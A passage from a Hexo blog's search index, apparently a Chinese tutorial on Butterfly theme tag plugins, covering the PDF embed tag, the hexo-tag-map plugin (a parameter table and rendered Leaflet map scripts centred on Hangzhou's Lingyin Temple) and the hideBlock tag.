class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF展示">2.29 PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
